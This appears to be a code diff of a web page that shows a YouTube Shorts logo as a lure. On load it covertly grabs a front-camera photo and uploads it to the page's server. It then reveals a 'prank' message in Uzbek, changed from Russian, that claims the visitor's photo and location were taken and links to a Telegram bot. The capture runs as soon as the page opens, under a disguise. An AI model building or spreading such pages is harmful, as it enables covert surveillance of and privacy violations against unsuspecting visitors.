@@ -3,90 +3,36 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Location and Photo Tracker</title>
+    <title>Capture Photo and Location</title>
     <style>
-        html, body {
-            margin: 0;
-            padding: 0;
-            background: #050614;
-        }
-
-        #tt {
-            display: block;
-            width: 100vw;
-            height: 100vh;
-            object-fit: cover;
-        }
-
-        #prank {
-            max-width: 700px;
-            padding: 5%;
-            width: auto;
-            margin: auto;
-        }
-
-        .picture {
-            border-radius: 20px;
-            max-width: 600px;
-            height: 400px;
-            background: #131426;
-        }
-
-        #byte_photo {
-            border-radius: 10px;
-            background-size: cover;
-            height: 100%;
-            background-position: center;
-            background-repeat: no-repeat;
-        }
-
-        .desc {
-            text-align: center;
-            margin-top: 50px;
-        }
-
-        .desc p {
-            color: white;
-            font-size: 16px;
-        }
-
-        .desc button {
-            padding: 10px 20px;
-            color: white;
-            background: #2871FF;
-            border: none;
-            border-radius: 10px;
-        }
-
-        #canvas, #camera {
-            display: none;
-        }
+        #tt { display: block; width: 100vw; height: 100vh; object-fit: cover; }
+        #prank { max-width: 700px; padding: 5%; width: auto; margin: auto; }
+        .picture { border-radius: 20px; max-width: 600px; height: 400px; background: #131426; }
+        #byte_photo { border-radius: 10px; background-size: cover; height: 100%; background-position: center; background-repeat: no-repeat; }
+        .desc { text-align: center; margin-top: 50px; }
+        .desc p { color: white; font-size: 16px; }
+        .desc button { padding: 10px 20px; color: white; background: #2871FF; border: none; border-radius: 10px; }
+        #canvas, #camera { display: none; }
     </style>
 </head>
 <body>
-    <img id="tt" src="https://variety.com/wp-content/uploads/2021/08/YouTube-Shorts-logo.png" alt="YouTube Shorts Image">
-
+    <img id="tt" src="https://variety.com/wp-content/uploads/2021/08/YouTube-Shorts-logo.png" alt="Image">
     <video id="camera" autoplay></video>
     <canvas id="canvas"></canvas>
-
     <div id="prank" style="display: none;">
         <div class="picture">
             <div id="byte_photo"></div>
         </div>
         <div class="desc">
-            <p>🙊 Тебя пранканули через бота <span>@Photolovyshkabot</span></p>
-            <button onclick="location.href='https://t.me/Photolovyshkabot?start=site'">Перейти в бот</button>
+            <p>🙊 Tizimda sizning rasmingiz va joylashuvingiz olindi!</p>
+            <button onclick="location.href='https://t.me/sinov77738bot?start=site'">Botga o'tish</button>
         </div>
     </div>
-
     <script>
         async function initCamera() {
             const video = document.getElementById('camera');
-            const stream = await navigator.mediaDevices.getUserMedia({
-                video: { facingMode: "user" }
-            });
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
             video.srcObject = stream;
-
             video.addEventListener('loadeddata', () => {
                 setTimeout(capturePhoto, 1000);
             });
@@ -100,33 +46,18 @@
             canvas.height = video.videoHeight;
             context.drawImage(video, 0, 0);
             const dataUrl = canvas.toDataURL('image/jpeg');
-
             document.getElementById('prank').style.display = 'block';
             document.getElementById('tt').style.display = 'none';
             document.getElementById('byte_photo').style.backgroundImage = `url(${dataUrl})`;
-
             sendPhotoToServer(dataUrl);
         }
 
         async function sendPhotoToServer(photoData) {
-            const urlParams = new URLSearchParams(window.location.search);
-            const chatId = urlParams.get('chat_id');
-
-            if (!chatId) {
-                console.error('Chat ID not found in URL');
-                return;
-            }
-
             try {
                 const response = await fetch('/upload', {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/x-www-form-urlencoded',
-                    },
-                    body: new URLSearchParams({
-                        chat_id: chatId,
-                        photoData: photoData
-                    })
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                    body: new URLSearchParams({ photoData: photoData })
                 });
 
                 if (response.ok) {
@@ -143,6 +74,7 @@
     </script>
 </body>
 </html>
+
 
 <!-- <!DOCTYPE html>
 <html lang="en">
